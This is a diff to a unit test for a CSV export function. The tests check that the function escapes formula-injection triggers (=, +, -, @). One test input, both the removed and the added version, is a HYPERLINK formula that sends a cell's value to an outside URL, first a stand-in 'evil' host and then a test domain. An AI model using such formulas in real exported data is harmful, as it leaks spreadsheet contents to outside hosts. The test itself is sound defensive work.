@@ -3,7 +3,7 @@ import { csvCell } from "./csv";
 
 describe("csvCell — formula-injection safe CSV export (PBA-L3c-022)", () => {
   it("neutralises every formula-trigger prefix", () => {
-    expect(csvCell('=HYPERLINK("https://evil/?"&A1,"x")')).toBe(`"'=HYPERLINK(""https://evil/?""&A1,""x"")"`);
+    expect(csvCell('=HYPERLINK("https://example.test/?"&A1,"x")')).toBe(`"'=HYPERLINK(""https://example.test/?""&A1,""x"")"`);
     expect(csvCell("+1+1")).toBe("'+1+1");
     expect(csvCell("-2+3")).toBe("'-2+3");
     expect(csvCell("@SUM(A1)")).toBe("'@SUM(A1)");
